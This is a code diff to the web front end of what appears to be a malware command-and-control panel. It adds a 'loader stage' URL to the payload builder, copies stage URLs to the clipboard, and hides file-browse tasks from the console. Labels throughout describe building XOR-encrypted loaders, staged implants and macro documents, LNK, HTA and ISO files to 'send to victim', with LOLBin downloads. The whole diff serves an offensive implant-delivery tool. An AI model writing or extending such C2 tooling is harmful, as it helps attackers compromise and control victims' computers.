@@ -12147,6 +12147,9 @@ async function pollResult(taskID, agentID, timeoutMs = 120000, meta = {}) {
           delete pollTimers[key];
           return;
         }
+        // File-explorer browse tasks are internal — don't pollute the console.
+        const _SILENT_BROWSE = new Set(['LS_JSON', 'PS_JSON', 'DRIVES', 'NET_SHARES']);
+        if (_SILENT_BROWSE.has(r.data.task_type)) { delete pollTimers[key]; return; }
         // Do not disguise an empty SHELL capture as a successful command.
         const shown = out || (err ? '' :
           (r.data.task_type === 'SHELL' ? '[empty output]' : '[done]'));
@@ -12919,12 +12922,13 @@ async function buildLoader() {
   const r = await api('POST', '/api/build', body);
   if (r.ok) {
     const d = r.data || {};
-    const loaderFile = (d.loader || '').split('/').pop();
-    const rawKB      = d.raw_kb || '?';
-    const compKB     = d.compressed_kb || rawKB;
-    const stageEndpt = d.bin_stage || '';
-    const dlURL      = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
-    const sizeLabel  = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> compressed+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
+    const loaderFile   = (d.loader || '').split('/').pop();
+    const rawKB        = d.raw_kb || '?';
+    const compKB       = d.compressed_kb || rawKB;
+    const stageEndpt   = d.bin_stage || '';
+    const loaderStage  = d.loader_stage || '';
+    const dlURL        = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${encodeURIComponent(TOKEN)}` : '';
+    const sizeLabel    = d.compressed_kb ? `${esc(rawKB)} KB raw → <b>${esc(compKB)} KB</b> compressed+XOR` : `${esc(rawKB)} KB (XOR encrypted)`;
     res.innerHTML = `
       <div class="result-card" style="border-color:var(--green)">
         <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo</div>
@@ -12932,7 +12936,8 @@ async function buildLoader() {
           <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
           <div><span style="color:var(--text3)">Staged implant:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
           <div><span style="color:var(--text3)">Size:</span> ${sizeLabel}</div>
-          <div style="word-break:break-all"><span style="color:var(--text3)">Stage URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code></div>
+          <div style="word-break:break-all"><span style="color:var(--text3)">Implant URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(stageEndpt)})">⎘</button></div>
+          ${loaderStage ? `<div style="word-break:break-all"><span style="color:var(--text3)">Loader URL:</span> <code style="font-size:10px">${esc(loaderStage)}</code> <button class="btn btn-ghost btn-sm" style="padding:1px 6px;font-size:10px" onclick="navigator.clipboard.writeText(${JSON.stringify(loaderStage)})">⎘</button></div>` : ''}
           ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
         </div>
         ${dlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}" style="margin-top:8px;display:inline-block" download>⬇ Download loader</a>` : ''}
@@ -13648,7 +13653,7 @@ async function buildPayload() {
     const r = await api('POST', '/api/build', body);
     if (r.ok) {
       renderBuildResult(res, r.data);
-      const stageURL = r.data?.bin_stage;
+      const stageURL = r.data?.bin_stage || r.data?.loader_stage;
       if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copied to clipboard', 'green'); }
       else toast('Payload built!');
     } else {
@@ -13706,7 +13711,7 @@ async function buildPayloadStream(res, body) {
             clearInterval(timer);
             if (evt.type === 'done') {
               renderBuildResult(res, evt.result);
-              const stageURL = evt.result?.bin_stage;
+              const stageURL = evt.result?.bin_stage || evt.result?.loader_stage;
               if (stageURL) { copyText(stageURL); toast('✓ Build OK — Stage URL copied to clipboard', 'green'); }
               else toast('Payload built!');
             } else if (evt.type === 'error') {
@@ -13749,6 +13754,7 @@ function renderBuildResult(container, data) {
     wsf:'Windows Script File — send to victim',
     docm:'Word DOCM — send to victim (requires Enable Macros)',
     bin_stage:'Stage URL — already active on C2 (no manual upload needed)',
+    loader_stage:'Loader Stage URL — loader EXE staged on C2 (send to victim)',
     runner_stage:'Stage URL runner DLL — already active on C2',
     ps1_stage:'Stage URL loader PS1 — already active on C2 (LNK downloads it automatically)',
     exe_stage:'Stage URL EXE — LOLBin downloads it directly',
@@ -13763,7 +13769,7 @@ function renderBuildResult(container, data) {
                     lnk:'🔗',iso:'💿',hta:'🌐',html:'🌐',linux:'🐧',macho:'🍎'};
 
   // Stage URLs first, files second
-  const stageKeys = ['bin_stage','runner_stage','exe_stage'];
+  const stageKeys = ['bin_stage','loader_stage','runner_stage','exe_stage'];
   const fileKeys  = Object.keys(data).filter(k => !stageKeys.includes(k));
   const ordered   = [...stageKeys.filter(k => data[k]), ...fileKeys];
 
